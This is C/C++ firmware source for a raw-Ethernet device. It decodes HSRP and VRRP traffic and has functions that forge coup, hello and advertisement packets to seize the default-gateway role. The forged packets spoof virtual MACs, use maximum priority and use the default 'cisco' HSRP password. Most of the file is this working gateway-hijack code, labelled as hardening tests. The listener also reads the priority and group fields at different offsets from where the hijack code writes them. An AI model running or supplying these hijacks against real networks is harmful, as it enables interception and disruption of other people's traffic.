#include "fhrp.h"
#include "../include/config.h"
#include "net_util.h"
#include "weblog.h"
#include <string.h>

#define Serial Out

#define ETHERTYPE_IPV4 0x0800
#define IPPROTO_UDP    17
#define IPPROTO_VRRP   112
#define HSRP_PORT      1985

// Host-order IPv4 from octets
static inline uint32_t ipv4(uint8_t a, uint8_t b, uint8_t c, uint8_t d)
{ return ((uint32_t)a << 24) | ((uint32_t)b << 16) | ((uint32_t)c << 8) | d; }

// ---- IPv4 frame builder -----------------------------------------------------
// Fills `f` with Ethernet + IPv4 header and returns the offset of the L4
// payload area. Caller writes the payload, then calls fhrpFinishIp().
static uint16_t fhrpBuildIp(uint8_t *f, const uint8_t dstMac[6],
                            const uint8_t srcMac[6], uint32_t srcIp,
                            uint32_t dstIp, uint8_t proto, uint8_t ttl)
{
    memcpy(f, dstMac, 6);
    memcpy(f + 6, srcMac, 6);
    put16(f + 12, ETHERTYPE_IPV4);

    uint8_t *ip = f + 14;
    ip[0] = 0x45;            // version 4, IHL 5
    ip[1] = 0x00;            // DSCP/ECN
    // total length filled later
    put16(ip + 4, 0);        // identification
    put16(ip + 6, 0);        // flags / fragment offset
    ip[8] = ttl;
    ip[9] = proto;
    put16(ip + 10, 0);       // checksum (later)
    put32(ip + 12, srcIp);
    put32(ip + 16, dstIp);
    return 14 + 20;          // payload offset
}

// Finalise IPv4 total length + header checksum. Returns full frame length
// (zero-padded to ETH_MIN_LEN).
static uint16_t fhrpFinishIp(uint8_t *f, uint16_t payloadOff, uint16_t payloadLen)
{
    uint8_t *ip = f + 14;
    uint16_t ipTotal = 20 + payloadLen;
    put16(ip + 2, ipTotal);
    put16(ip + 10, 0);
    uint16_t csum = inetChecksum(ip, 20);
    put16(ip + 10, csum);

    uint16_t frameLen = payloadOff + payloadLen;
    if (frameLen < ETH_MIN_LEN) frameLen = ETH_MIN_LEN;
    return frameLen;
}

static const char *hsrpStateName(uint8_t s)
{
    switch (s) {
        case 0:  return "Initial";
        case 1:  return "Learn";
        case 2:  return "Listen";
        case 4:  return "Speak";
        case 8:  return "Standby";
        case 16: return "Active";
        default: return "?";
    }
}

// =============================================================================
// Passive listener
// =============================================================================
uint32_t fhrpListen(W5500Raw &eth, uint32_t seconds)
{
    Serial.printf("\r\nListening for HSRP/VRRP for %lu s (any key aborts)...\r\n",
                  (unsigned long)seconds);
    static uint8_t buf[ETH_MAX_LEN + 4];
    uint32_t deadline = millis() + seconds * 1000UL;
    uint32_t n = 0;

    while ((int32_t)(deadline - millis()) > 0) {
        uint16_t len = eth.recvFrame(buf, sizeof(buf));
        if (len >= 14 + 20 && get16(buf + 12) == ETHERTYPE_IPV4) {
            const uint8_t *ip = buf + 14;
            uint8_t ihl = (ip[0] & 0x0F) * 4;
            uint8_t proto = ip[9];
            uint32_t srcIp = get32(ip + 12);
            char s[16]; ipToStr(srcIp, s);
            const uint8_t *l4 = ip + ihl;

            if (proto == IPPROTO_UDP && (len >= 14 + ihl + 8)) {
                uint16_t dport = get16(l4 + 2);
                if (dport == HSRP_PORT) {
                    const uint8_t *h = l4 + 8;
                    if (len >= (uint16_t)(14 + ihl + 8 + 20) && h[0] == 0) {
                        uint8_t op = h[1], st = h[2], pri = h[6], grp = h[7];
                        char vip[16]; ipToStr(get32(h + 16), vip);
                        const char *opn = op == 0 ? "Hello" : op == 1 ? "Coup" :
                                          op == 2 ? "Resign" : "?";
                        Serial.printf("\r\n[%lu] HSRP %s  grp %u  pri %u  state %s\r\n",
                                      (unsigned long)(n + 1), opn, grp, pri,
                                      hsrpStateName(st));
                        Serial.printf("   from %s  virtual IP %s\r\n", s, vip);
                        char auth[9]; memcpy(auth, h + 8, 8); auth[8] = 0;
                        Serial.printf("   auth '%s'\r\n", auth);
                        n++;
                    }
                }
            } else if (proto == IPPROTO_VRRP && (len >= 14 + ihl + 8)) {
                uint8_t ver = l4[0] >> 4;
                uint8_t vrid = l4[1], pri = l4[2], naddr = l4[3];
                Serial.printf("\r\n[%lu] VRRPv%u  VRID %u  pri %u  addrs %u\r\n",
                              (unsigned long)(n + 1), ver, vrid, pri, naddr);
                Serial.printf("   from %s\r\n", s);
                for (uint8_t i = 0; i < naddr && (len >= 14 + ihl + 8 + 4 * (i + 1)); i++) {
                    char vip[16]; ipToStr(get32(l4 + 8 + i * 4), vip);
                    Serial.printf("   virtual IP %s%s\r\n", vip,
                                  pri == 255 ? " (address owner)" : "");
                }
                n++;
            }
        }
        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
        delay(1);
    }
    Serial.printf("\r\nDone. %lu FHRP message(s) decoded.\r\n", (unsigned long)n);
    return n;
}

// =============================================================================
// HSRP hijack
// =============================================================================
void hsrpHijack(W5500Raw &eth, const uint8_t srcMac[6], uint32_t srcIp,
                uint8_t group, uint32_t virtualIp, uint8_t priority,
                uint32_t count, uint32_t intervalMs)
{
    if (srcIp == 0) { Serial.println("HSRP hijack: set a source IP first (ip static/dhcp)."); return; }
    if (count == 0) count = 20;
    (void)srcMac;

    // HSRP virtual MAC 00:00:0c:07:ac:GG -- using it as L2 source redirects the
    // gateway's traffic to this port.
    uint8_t vmac[6] = { 0x00, 0x00, 0x0C, 0x07, 0xAC, group };
    const uint8_t dstMac[6] = { 0x01, 0x00, 0x5E, 0x00, 0x00, 0x02 };   // 224.0.0.2
    uint32_t dstIp = ipv4(224, 0, 0, 2);

    char vip[16]; ipToStr(virtualIp, vip);
    Serial.printf("\r\nHSRP hijack: group %u, virtual IP %s, priority %u, x%lu\r\n",
                  group, vip, priority, (unsigned long)count);
    Serial.println("Source = HSRP virtual MAC 00:00:0c:07:ac:GG (gateway takeover).");
    Serial.println("Tests HSRP authentication / FHRP hardening. Any key aborts.");

    static uint8_t f[ETH_MIN_LEN + 64];
    for (uint32_t i = 0; i < count; i++) {
        memset(f, 0, sizeof(f));
        uint16_t off = fhrpBuildIp(f, dstMac, vmac, srcIp, dstIp, IPPROTO_UDP, 1);

        // UDP header.
        uint8_t *udp = f + off;
        put16(udp + 0, HSRP_PORT);
        put16(udp + 2, HSRP_PORT);
        // length + checksum filled below; HSRP payload starts at udp+8.
        uint8_t *h = udp + 8;
        h[0] = 0;                                   // version 1
        h[1] = (i == 0) ? 1 : 0;                    // op: Coup first, then Hello
        h[2] = 16;                                  // state: Active
        h[3] = 3;                                   // hellotime
        h[4] = 10;                                  // holdtime
        h[5] = priority;
        h[6] = group;
        h[7] = 0;                                   // reserved
        memcpy(h + 8, "cisco\0\0\0", 8);            // default authentication
        put32(h + 16, virtualIp);

        uint16_t udpLen = 8 + 20;
        put16(udp + 4, udpLen);
        put16(udp + 6, 0);                          // UDP checksum optional (0)

        uint16_t frameLen = fhrpFinishIp(f, off, udpLen);
        eth.sendFrame(f, frameLen);

        if (i == 0) Serial.println("-> HSRP Coup (Active, max priority)");
        else if ((i % 5) == 0) Serial.printf("-> HSRP Hello x%lu\r\n", (unsigned long)i);

        uint32_t t = millis();
        while ((millis() - t) < intervalMs) {
            if (Serial.available()) { while (Serial.available()) Serial.read();
                Serial.println("\r\nAborted."); return; }
            delay(5);
        }
    }
    Serial.println("\r\nHSRP hijack complete.");
}

// =============================================================================
// VRRP hijack
// =============================================================================
void vrrpHijack(W5500Raw &eth, const uint8_t srcMac[6], uint32_t srcIp,
                uint8_t vrid, uint32_t virtualIp, uint8_t priority,
                uint32_t count, uint32_t intervalMs)
{
    if (srcIp == 0) { Serial.println("VRRP hijack: set a source IP first (ip static/dhcp)."); return; }
    if (count == 0) count = 30;
    (void)srcMac;

    // VRRP virtual MAC 00:00:5e:00:01:VR.
    uint8_t vmac[6] = { 0x00, 0x00, 0x5E, 0x00, 0x01, vrid };
    const uint8_t dstMac[6] = { 0x01, 0x00, 0x5E, 0x00, 0x00, 0x12 };   // 224.0.0.18
    uint32_t dstIp = ipv4(224, 0, 0, 18);

    char vip[16]; ipToStr(virtualIp, vip);
    Serial.printf("\r\nVRRP hijack: VRID %u, virtual IP %s, priority %u, x%lu\r\n",
                  vrid, vip, priority, (unsigned long)count);
    Serial.println("Source = VRRP virtual MAC 00:00:5e:00:01:VR (master takeover).");
    Serial.println("Tests VRRP authentication / FHRP hardening. Any key aborts.");

    static uint8_t f[ETH_MIN_LEN + 64];
    for (uint32_t i = 0; i < count; i++) {
        memset(f, 0, sizeof(f));
        // VRRP requires TTL 255; routers drop advertisements with any other TTL.
        uint16_t off = fhrpBuildIp(f, dstMac, vmac, srcIp, dstIp, IPPROTO_VRRP, 255);

        uint8_t *v = f + off;
        v[0] = 0x21;            // version 2, type 1 (Advertisement)
        v[1] = vrid;
        v[2] = priority;
        v[3] = 1;               // count IP addresses
        v[4] = 0;               // auth type: none
        v[5] = 1;               // advertisement interval (s)
        put16(v + 6, 0);        // checksum (later)
        put32(v + 8, virtualIp);
        uint16_t vrrpLen = 12;  // header(8) + one IP(4), no auth data
        put16(v + 6, inetChecksum(v, vrrpLen));

        uint16_t frameLen = fhrpFinishIp(f, off, vrrpLen);
        eth.sendFrame(f, frameLen);

        if ((i % 10) == 0)
            Serial.printf("-> VRRP advert x%lu (pri %u)\r\n", (unsigned long)i, priority);

        uint32_t t = millis();
        while ((millis() - t) < intervalMs) {
            if (Serial.available()) { while (Serial.available()) Serial.read();
                Serial.println("\r\nAborted."); return; }
            delay(5);
        }
    }
    Serial.println("\r\nVRRP hijack complete.");
}
